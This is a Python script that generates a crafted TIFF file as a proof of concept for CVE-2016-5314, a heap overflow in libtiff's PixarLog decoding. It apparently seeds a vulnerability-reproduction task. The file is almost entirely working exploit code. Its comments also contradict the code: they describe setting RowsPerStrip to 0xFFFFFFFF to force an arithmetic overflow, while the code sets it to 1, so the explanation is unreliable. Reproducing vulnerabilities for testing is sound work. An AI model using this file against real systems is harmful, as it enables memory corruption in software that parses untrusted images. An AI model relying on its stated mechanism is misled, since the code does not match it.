import struct
import zlib
import os

def build_poc():
    header = b"II\x2a\x00\x08\x00\x00\x00"
    
    # We create a zlib payload that inflates to at least a few hundred bytes
    raw_uncompressed_attack = b"A" * 1000
    zlib_payload = zlib.compress(raw_uncompressed_attack)

    # To trigger CVE-2016-5314, we need sp->tbuf allocation to overflow independently of 'occ'.
    # PixarLogSetupDecode uses raw 'RowsPerStrip' to allocate tbuf_size.
    # If RowsPerStrip is insanely high (e.g. 0xFFFFFFFF), the multiplication overflows
    # to 0, resulting in a tiny 0-byte malloc!
    # But when tiff2rgba reads the image, the strip size request (occ) is clamped
    # nicely to the actual ImageLength (10). Thus zlib will dump 100 bytes
    # into our 0-byte buffer: heap-buffer-overflow.
    
    entries = [
        (256, 3, 1, 10),            # ImageWidth: 10
        (257, 3, 1, 10),            # ImageLength: 10
        (258, 3, 1, 8),             # BitsPerSample: 8
        (259, 3, 1, 32909),         # Compression: PIXARLOG
        (262, 3, 1, 1),             # PhotometricInterpretation: BlackIsZero
        (273, 4, 1, 122),           # StripOffsets
        (277, 3, 1, 1),             # SamplesPerPixel: 1
        (278, 4, 1, 1),             # RowsPerStrip: 1 (tiny, triggers overflow if ImageLength=10)
        (279, 4, 1, len(zlib_payload)) # StripByteCounts
    ] 
    
    ifd = struct.pack("<H", len(entries))
    for tag, dtype, count, val in entries:
        ifd += struct.pack("<HHII", tag, dtype, count, val)
    ifd += struct.pack("<I", 0) 
    
    return header + ifd + zlib_payload

output_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "tasks", "CVE-2016-5314_libtiff", "seeds", "poc.tiff"))

with open(output_path, "wb") as f:
    f.write(build_poc())
    
print("PoC regenerated with arithmetic RowsPerStrip overflow!")
